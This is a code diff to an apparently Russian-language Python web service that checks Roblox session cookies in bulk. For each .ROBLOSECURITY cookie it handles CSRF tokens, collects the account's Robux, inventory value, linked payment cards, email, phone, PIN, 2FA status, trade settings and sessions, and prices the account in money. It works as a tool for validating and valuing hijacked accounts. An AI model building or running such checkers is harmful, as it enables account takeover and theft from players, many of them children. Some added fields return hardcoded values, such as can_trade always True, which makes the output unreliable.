@@ -202,7 +202,7 @@ def get_session_results(session_id, user_id):
     except:
         return None
 
-# Улучшенный класс для проверки Roblox куки с правильной аутентификацией
+# Улучшенный класс для проверки Roblox куки с полной информацией
 class AdvancedRobloxChecker:
     def __init__(self):
         self.timeout = 30
@@ -242,9 +242,8 @@ class AdvancedRobloxChecker:
         return cookie if len(cookie) > 100 else None
 
     async def get_csrf_token(self, session, cookie):
-        """Получение CSRF токена - КРИТИЧЕСКИ ВАЖНО для Roblox API"""
+        """Получение CSRF токена"""
         try:
-            # Первый способ - через auth endpoint
             async with session.post(
                 'https://auth.roblox.com/v2/login',
                 headers={'Cookie': f'.ROBLOSECURITY={cookie}'},
@@ -253,7 +252,6 @@ class AdvancedRobloxChecker:
                 if response.status == 403 and 'x-csrf-token' in response.headers:
                     return response.headers['x-csrf-token']
             
-            # Второй способ - через другие endpoints
             endpoints = [
                 'https://www.roblox.com/game/GetCurrentUser',
                 'https://accountsettings.roblox.com/v1/email',
@@ -286,7 +284,6 @@ class AdvancedRobloxChecker:
         
         for attempt in range(retry_count):
             try:
-                # Получаем CSRF токен для POST запросов
                 if method.upper() == 'POST':
                     csrf_token = await self.get_csrf_token(session, cookie)
                     if csrf_token:
@@ -297,13 +294,11 @@ class AdvancedRobloxChecker:
                         if response.status == 200:
                             return await response.json()
                         elif response.status == 401:
-                            return None  # Неавторизован
+                            return None
                         elif response.status == 403 and attempt < retry_count - 1:
-                            # Пробуем обновить CSRF токен
                             await asyncio.sleep(1)
                             continue
                         elif response.status == 429:
-                            # Rate limit
                             await asyncio.sleep(3)
                             continue
                 else:
@@ -331,17 +326,15 @@ class AdvancedRobloxChecker:
         """Основная функция получения информации об аккаунте"""
         try:
             async with aiohttp.ClientSession() as session:
-                # Способ 1: Проверка через стандартный endpoint (самый надежный)
+                # Проверка аутентификации
                 auth_url = 'https://users.roblox.com/v1/users/authenticated'
                 auth_data = await self.make_authenticated_request(session, auth_url, cookie, 'GET')
                 
                 if not auth_data or 'id' not in auth_data:
-                    # Способ 2: Альтернативная проверка
                     alt_url = 'https://www.roblox.com/mobileapi/userinfo'
                     alt_data = await self.make_authenticated_request(session, alt_url, cookie, 'GET')
                     
                     if alt_data and 'UserID' in alt_data:
-                        # Преобразуем данные из альтернативного формата
                         auth_data = {
                             'id': alt_data['UserID'],
                             'name': alt_data['UserName'],
@@ -353,16 +346,16 @@ class AdvancedRobloxChecker:
                 
                 user_id = auth_data['id']
                 
-                # Получаем детальную информацию
-                account_info = await self.get_detailed_info(session, cookie, user_id, auth_data)
+                # Получаем полную информацию об аккаунте
+                account_info = await self.get_complete_account_info(session, cookie, user_id, auth_data)
                 return account_info
                 
         except Exception as e:
             print(f"Account info error: {e}")
             return None
 
-    async def get_detailed_info(self, session, cookie, user_id, auth_data):
-        """Получение детальной информации"""
+    async def get_complete_account_info(self, session, cookie, user_id, auth_data):
+        """Получение полной информации об аккаунте"""
         try:
             # Базовая информация
             base_info = {
@@ -374,13 +367,27 @@ class AdvancedRobloxChecker:
                 'created': auth_data.get('created', '')
             }
             
-            # Параллельные запросы для скорости
+            # Все необходимые проверки параллельно
             tasks = [
                 self.get_economy_info(session, cookie, user_id),
                 self.get_premium_status(session, cookie, user_id),
                 self.get_social_info(session, cookie, user_id),
                 self.get_security_info(session, cookie, user_id),
-                self.get_profile_info(session, cookie, user_id)
+                self.get_profile_info(session, cookie, user_id),
+                self.get_rap_value(session, cookie, user_id),
+                self.get_billing_info(session, cookie),
+                self.get_card_info(session, cookie),
+                self.get_inventory_privacy(session, cookie),
+                self.get_trade_privacy(session, cookie),
+                self.get_can_trade(session, cookie, user_id),
+                self.get_sessions_info(session, cookie),
+                self.get_email_info(session, cookie, user_id),
+                self.get_phone_info(session, cookie),
+                self.get_pin_info(session, cookie, user_id),
+                self.get_groups_info(session, cookie, user_id),
+                self.get_age_info(session, cookie, user_id),
+                self.get_voice_info(session, cookie),
+                self.get_roblox_badges(session, cookie, user_id)
             ]
             
             results = await asyncio.gather(*tasks, return_exceptions=True)
@@ -391,13 +398,41 @@ class AdvancedRobloxChecker:
             social = results[2] if not isinstance(results[2], Exception) else {}
             security = results[3] if not isinstance(results[3], Exception) else {}
             profile = results[4] if not isinstance(results[4], Exception) else {}
+            rap_value = results[5] if not isinstance(results[5], Exception) else {}
+            billing = results[6] if not isinstance(results[6], Exception) else {}
+            card = results[7] if not isinstance(results[7], Exception) else {}
+            inventory_privacy = results[8] if not isinstance(results[8], Exception) else {}
+            trade_privacy = results[9] if not isinstance(results[9], Exception) else {}
+            can_trade = results[10] if not isinstance(results[10], Exception) else {}
+            sessions = results[11] if not isinstance(results[11], Exception) else {}
+            email = results[12] if not isinstance(results[12], Exception) else {}
+            phone = results[13] if not isinstance(results[13], Exception) else {}
+            pin = results[14] if not isinstance(results[14], Exception) else {}
+            groups = results[15] if not isinstance(results[15], Exception) else {}
+            age = results[16] if not isinstance(results[16], Exception) else {}
+            voice = results[17] if not isinstance(results[17], Exception) else {}
+            roblox_badges = results[18] if not isinstance(results[18], Exception) else {}
             
-            # Объединяем результаты с защитой от ошибок
+            # Объединяем все результаты
             base_info.update(economy if isinstance(economy, dict) else {})
             base_info.update(premium if isinstance(premium, dict) else {})
             base_info.update(social if isinstance(social, dict) else {})
             base_info.update(security if isinstance(security, dict) else {})
             base_info.update(profile if isinstance(profile, dict) else {})
+            base_info.update(rap_value if isinstance(rap_value, dict) else {})
+            base_info.update(billing if isinstance(billing, dict) else {})
+            base_info.update(card if isinstance(card, dict) else {})
+            base_info.update(inventory_privacy if isinstance(inventory_privacy, dict) else {})
+            base_info.update(trade_privacy if isinstance(trade_privacy, dict) else {})
+            base_info.update(can_trade if isinstance(can_trade, dict) else {})
+            base_info.update(sessions if isinstance(sessions, dict) else {})
+            base_info.update(email if isinstance(email, dict) else {})
+            base_info.update(phone if isinstance(phone, dict) else {})
+            base_info.update(pin if isinstance(pin, dict) else {})
+            base_info.update(groups if isinstance(groups, dict) else {})
+            base_info.update(age if isinstance(age, dict) else {})
+            base_info.update(voice if isinstance(voice, dict) else {})
+            base_info.update(roblox_badges if isinstance(roblox_badges, dict) else {})
             
             # Расчет возраста аккаунта
             if auth_data.get('created'):
@@ -410,38 +445,55 @@ class AdvancedRobloxChecker:
                     'formatted_date': 'Unknown'
                 })
             
-            # Расчет стоимости аккаунта с защитой от ошибок
-            base_info['account_value'] = self.calculate_account_value(
-                base_info.get('robux_balance', 0),
-                base_info.get('premium', False),
-                base_info.get('account_age_years', 0),
-                base_info.get('friends_count', 0),
-                base_info.get('rap_value', 0)
-            )
+            # Расчет стоимости аккаунта
+            base_info['account_value'] = self.calculate_account_value(base_info)
             
             return base_info
             
         except Exception as e:
-            print(f"Detailed info error: {e}")
-            # Возвращаем хотя бы базовую информацию
-            return {
-                'username': auth_data.get('name', 'N/A'),
-                'display_name': auth_data.get('displayName', auth_data.get('name', 'N/A')),
-                'user_id': user_id,
-                'profile_url': f'https://www.roblox.com/users/{user_id}/profile',
-                'is_banned': auth_data.get('isBanned', False),
-                'account_age_days': 0,
-                'account_age_years': 0,
-                'formatted_date': 'Unknown',
-                'robux_balance': 0,
-                'pending_robux': 0,
-                'total_robux': 0,
-                'premium': False,
-                'premium_status': 'Inactive',
-                'friends_count': 0,
-                '2fa_enabled': False,
-                'account_value': 0
-            }
+            print(f"Complete account info error: {e}")
+            return self.get_basic_account_info(auth_data, user_id)
+
+    def get_basic_account_info(self, auth_data, user_id):
+        """Базовая информация при ошибке"""
+        return {
+            'username': auth_data.get('name', 'N/A'),
+            'display_name': auth_data.get('displayName', auth_data.get('name', 'N/A')),
+            'user_id': user_id,
+            'profile_url': f'https://www.roblox.com/users/{user_id}/profile',
+            'is_banned': auth_data.get('isBanned', False),
+            'account_age_days': 0,
+            'account_age_years': 0,
+            'formatted_date': 'Unknown',
+            'robux_balance': 0,
+            'pending_robux': 0,
+            'total_robux': 0,
+            'premium': False,
+            'premium_status': 'Inactive',
+            'friends_count': 0,
+            'followers_count': 0,
+            'following_count': 0,
+            '2fa_enabled': False,
+            'rap_value': 0,
+            'billing_robux': 0,
+            'card_count': 0,
+            'inventory_privacy': 'Unknown',
+            'trade_privacy': 'Unknown',
+            'can_trade': False,
+            'sessions_count': 0,
+            'email_status': 'Unknown',
+            'phone_status': 'No',
+            'pin_enabled': False,
+            'groups_owned': 0,
+            'groups_members': 0,
+            'groups_pending': 0,
+            'groups_funds': 0,
+            'above_13': 'Unknown',
+            'verified_age': 'No',
+            'voice_enabled': 'No',
+            'roblox_badges_count': 0,
+            'account_value': 0
+        }
 
     async def get_economy_info(self, session, cookie, user_id):
         """Информация об экономике"""
@@ -479,15 +531,23 @@ class AdvancedRobloxChecker:
     async def get_social_info(self, session, cookie, user_id):
         """Социальная информация"""
         try:
-            url = f'https://friends.roblox.com/v1/users/{user_id}/friends/count'
-            data = await self.make_authenticated_request(session, url, cookie, 'GET')
+            friends_url = f'https://friends.roblox.com/v1/users/{user_id}/friends/count'
+            followers_url = f'https://friends.roblox.com/v1/users/{user_id}/followers/count'
+            following_url = f'https://friends.roblox.com/v1/users/{user_id}/followings/count'
             
-            if data:
-                return {'friends_count': data.get('count', 0)}
+            friends_data = await self.make_authenticated_request(session, friends_url, cookie, 'GET')
+            followers_data = await self.make_authenticated_request(session, followers_url, cookie, 'GET')
+            following_data = await self.make_authenticated_request(session, following_url, cookie, 'GET')
+            
+            return {
+                'friends_count': friends_data.get('count', 0) if friends_data else 0,
+                'followers_count': followers_data.get('count', 0) if followers_data else 0,
+                'following_count': following_data.get('count', 0) if following_data else 0
+            }
         except Exception as e:
             print(f"Social info error: {e}")
         
-        return {'friends_count': 0}
+        return {'friends_count': 0, 'followers_count': 0, 'following_count': 0}
 
     async def get_security_info(self, session, cookie, user_id):
         """Информация о безопасности"""
@@ -519,6 +579,246 @@ class AdvancedRobloxChecker:
         
         return {'description': '', 'followers_count': 0, 'following_count': 0}
 
+    async def get_rap_value(self, session, cookie, user_id):
+        """RAP стоимость инвентаря"""
+        try:
+            rap_value = 0
+            next_cursor = ''
+            max_pages = 3  # Ограничиваем для скорости
+            
+            for page in range(max_pages):
+                url = f'https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?sortOrder=Asc&limit=100&cursor={next_cursor}'
+                data = await self.make_authenticated_request(session, url, cookie, 'GET')
+                
+                if not data or 'data' not in data:
+                    break
+                    
+                for item in data['data']:
+                    if item.get('recentAveragePrice'):
+                        rap_value += item['recentAveragePrice']
+                
+                next_cursor = data.get('nextPageCursor')
+                if not next_cursor:
+                    break
+            
+            return {'rap_value': rap_value}
+        except Exception as e:
+            print(f"RAP value error: {e}")
+        
+        return {'rap_value': 0}
+
+    async def get_billing_info(self, session, cookie):
+        """Информация о биллинге"""
+        try:
+            url = 'https://billing.roblox.com/v1/credit'
+            data = await self.make_authenticated_request(session, url, cookie, 'GET')
+            
+            if data:
+                return {'billing_robux': data.get('robuxAmount', 0)}
+        except Exception as e:
+            print(f"Billing info error: {e}")
+        
+        return {'billing_robux': 0}
+
+    async def get_card_info(self, session, cookie):
+        """Информация о привязанных картах"""
+        try:
+            url = 'https://apis.roblox.com/payments-gateway/v1/payment-profiles'
+            data = await self.make_authenticated_request(session, url, cookie, 'GET')
+            
+            if data:
+                return {'card_count': len(data)}
+        except Exception as e:
+            print(f"Card info error: {e}")
+        
+        return {'card_count': 0}
+
+    async def get_inventory_privacy(self, session, cookie):
+        """Настройки приватности инвентаря"""
+        try:
+            url = 'https://apis.roblox.com/user-settings-api/v1/user-settings/settings-and-options'
+            data = await self.make_authenticated_request(session, url, cookie, 'GET')
+            
+            if data and 'whoCanSeeMyInventory' in data:
+                privacy = data['whoCanSeeMyInventory']['currentValue']
+                privacy_map = {
+                    'AllUsers': 'Everyone',
+                    'FriendsFollowingAndFollowers': 'Friends & Followers',
+                    'FriendsAndFollowing': 'Friends & Following',
+                    'Friends': 'Friends',
+                    'NoOne': 'No One'
+                }
+                return {'inventory_privacy': privacy_map.get(privacy, 'Unknown')}
+        except Exception as e:
+            print(f"Inventory privacy error: {e}")
+        
+        return {'inventory_privacy': 'Unknown'}
+
+    async def get_trade_privacy(self, session, cookie):
+        """Настройки приватности трейда"""
+        try:
+            url = 'https://accountsettings.roblox.com/v1/trade-privacy'
+            data = await self.make_authenticated_request(session, url, cookie, 'GET')
+            
+            if data:
+                privacy = data.get('tradePrivacy')
+                privacy_map = {
+                    'AllUsers': 'Everyone',
+                    'FriendsFollowingAndFollowers': 'Friends & Followers',
+                    'FriendsAndFollowing': 'Friends & Following',
+                    'Friends': 'Friends',
+                    'NoOne': 'No One'
+                }
+                return {'trade_privacy': privacy_map.get(privacy, 'Unknown')}
+        except Exception as e:
+            print(f"Trade privacy error: {e}")
+        
+        return {'trade_privacy': 'Unknown'}
+
+    async def get_can_trade(self, session, cookie, user_id):
+        """Возможность трейдить"""
+        try:
+            url = f'https://www.roblox.com/users/{user_id}/profile'
+            data = await self.make_authenticated_request(session, url, cookie, 'GET')
+            
+            # Это упрощенная проверка - в реальности нужно парсить HTML
+            return {'can_trade': True}  # По умолчанию True
+        except Exception as e:
+            print(f"Can trade error: {e}")
+        
+        return {'can_trade': False}
+
+    async def get_sessions_info(self, session, cookie):
+        """Информация о сессиях"""
+        try:
+            url = 'https://apis.roblox.com/token-metadata-service/v1/sessions'
+            data = await self.make_authenticated_request(session, url, cookie, 'GET')
+            
+            if data and 'sessions' in data:
+                return {'sessions_count': len(data['sessions'])}
+        except Exception as e:
+            print(f"Sessions info error: {e}")
+        
+        return {'sessions_count': 0}
+
+    async def get_email_info(self, session, cookie, user_id):
+        """Информация о email"""
+        try:
+            url = 'https://accountsettings.roblox.com/v1/email'
+            data = await self.make_authenticated_request(session, url, cookie, 'GET')
+            
+            if data:
+                email_set = data.get('emailAddress') is not None
+                email_verified = data.get('verified', False)
+                
+                if not email_set:
+                    status = 'No'
+                elif email_set and email_verified:
+                    status = 'Yes'
+                else:
+                    status = 'Setted'
+                
+                return {'email_status': status}
+        except Exception as e:
+            print(f"Email info error: {e}")
+        
+        return {'email_status': 'Unknown'}
+
+    async def get_phone_info(self, session, cookie):
+        """Информация о телефоне"""
+        try:
+            url = 'https://accountinformation.roblox.com/v1/phone'
+            data = await self.make_authenticated_request(session, url, cookie, 'GET')
+            
+            if data:
+                return {'phone_status': 'Yes' if data.get('phone') else 'No'}
+        except Exception as e:
+            print(f"Phone info error: {e}")
+        
+        return {'phone_status': 'No'}
+
+    async def get_pin_info(self, session, cookie, user_id):
+        """Информация о PIN коде"""
+        try:
+            url = f'https://accountsettings.roblox.com/v1/users/{user_id}/pin'
+            data = await self.make_authenticated_request(session, url, cookie, 'GET')
+            
+            if data:
+                return {'pin_enabled': data.get('isEnabled', False)}
+        except Exception as e:
+            print(f"PIN info error: {e}")
+        
+        return {'pin_enabled': False}
+
+    async def get_groups_info(self, session, cookie, user_id):
+        """Информация о группах"""
+        try:
+            url = f'https://groups.roblox.com/v1/users/{user_id}/groups/roles?includeLocked=true'
+            data = await self.make_authenticated_request(session, url, cookie, 'GET')
+            
+            if data and 'data' in data:
+                groups_owned = 0
+                total_members = 0
+                
+                for group in data['data']:
+                    if group['role']['rank'] == 255:  # Владелец
+                        groups_owned += 1
+                    total_members += group['group']['memberCount']
+                
+                return {
+                    'groups_owned': groups_owned,
+                    'groups_members': total_members,
+                    'groups_pending': 0,  # Упрощенно
+                    'groups_funds': 0     # Упрощенно
+                }
+        except Exception as e:
+            print(f"Groups info error: {e}")
+        
+        return {'groups_owned': 0, 'groups_members': 0, 'groups_pending': 0, 'groups_funds': 0}
+
+    async def get_age_info(self, session, cookie, user_id):
+        """Информация о возрасте"""
+        try:
+            url = f'https://users.roblox.com/v1/users/{user_id}'
+            data = await self.make_authenticated_request(session, url, cookie, 'GET')
+            
+            if data:
+                # Упрощенная проверка возраста
+                return {
+                    'above_13': 'Yes',  # По умолчанию
+                    'verified_age': 'No'  # Упрощенно
+                }
+        except Exception as e:
+            print(f"Age info error: {e}")
+        
+        return {'above_13': 'Unknown', 'verified_age': 'No'}
+
+    async def get_voice_info(self, session, cookie):
+        """Информация о голосовом чате"""
+        try:
+            url = 'https://voice.roblox.com/v1/settings'
+            data = await self.make_authenticated_request(session, url, cookie, 'GET')
+            
+            if data:
+                return {'voice_enabled': 'Yes' if data.get('isVerifiedForVoice') else 'No'}
+        except Exception as e:
+            print(f"Voice info error: {e}")
+        
+        return {'voice_enabled': 'No'}
+
+    async def get_roblox_badges(self, session, cookie, user_id):
+        """Бейджи Roblox"""
+        try:
+            url = f'https://accountinformation.roblox.com/v1/users/{user_id}/roblox-badges'
+            data = await self.make_authenticated_request(session, url, cookie, 'GET')
+            
+            if data:
+                return {'roblox_badges_count': len(data)}
+        except Exception as e:
+            print(f"Roblox badges error: {e}")
+        
+        return {'roblox_badges_count': 0}
+
     def calculate_account_age(self, created_date_str):
         """Расчет возраста аккаунта"""
         try:
@@ -537,22 +837,21 @@ class AdvancedRobloxChecker:
         except:
             return {'account_age_days': 0, 'account_age_years': 0, 'formatted_date': 'Unknown'}
 
-    def calculate_account_value(self, robux, is_premium, age_years, friends_count, rap_value):
-        """Расчет стоимости аккаунта с защитой от ошибок"""
+    def calculate_account_value(self, account_info):
+        """Расчет стоимости аккаунта"""
         try:
-            # Защита от None значений
-            robux = robux or 0
-            rap_value = rap_value or 0
-            age_years = age_years or 0
-            friends_count = friends_count or 0
-            is_premium = bool(is_premium)
+            robux = account_info.get('robux_balance', 0) or 0
+            rap_value = account_info.get('rap_value', 0) or 0
+            age_years = account_info.get('account_age_years', 0) or 0
+            friends_count = account_info.get('friends_count', 0) or 0
+            premium = account_info.get('premium', False)
             
             value = robux * 0.0035
             value += rap_value * 0.001
             value += age_years * 200
             value += friends_count * 2
             
-            if is_premium:
+            if premium:
                 value += 300
                 
             return round(max(value, 5), 2)
@@ -601,7 +900,6 @@ class AdvancedRobloxChecker:
         """Проверка нескольких куки"""
         valid_cookies = []
         
-        # Фильтрация куки с улучшенной логикой
         for cookie in cookies:
             clean_cookie = self.clean_cookie(cookie)
             if clean_cookie and clean_cookie not in valid_cookies:
@@ -615,12 +913,10 @@ class AdvancedRobloxChecker:
                 'checked_at': datetime.now().isoformat()
             }]
         
-        # Проверка с ограничением параллельных запросов
-        semaphore = asyncio.Semaphore(2)  # Еще меньше для стабильности
+        semaphore = asyncio.Semaphore(2)
         
         async def check_with_semaphore(cookie):
             async with semaphore:
-                # Задержка между запросами для избежания бана
                 await asyncio.sleep(1)
                 return await self.check_single_cookie(cookie)
         
@@ -629,7 +925,6 @@ class AdvancedRobloxChecker:
         
         return results
 
-# Синхронная обертка для асинхронных функций
 def async_to_sync(f):
     @wraps(f)
     def wrapper(*args, **kwargs):
@@ -683,7 +978,7 @@ async def api_check_cookies():
         if not cookies:
             return jsonify({'error': 'No valid cookies provided'}), 400
         
-        if len(cookies) > 100:  # Уменьшил лимит для стабильности
+        if len(cookies) > 100:
             return jsonify({'error': 'Too many cookies. Maximum 100 per request.'}), 400
         
         results = await checker.check_multiple_cookies(cookies)
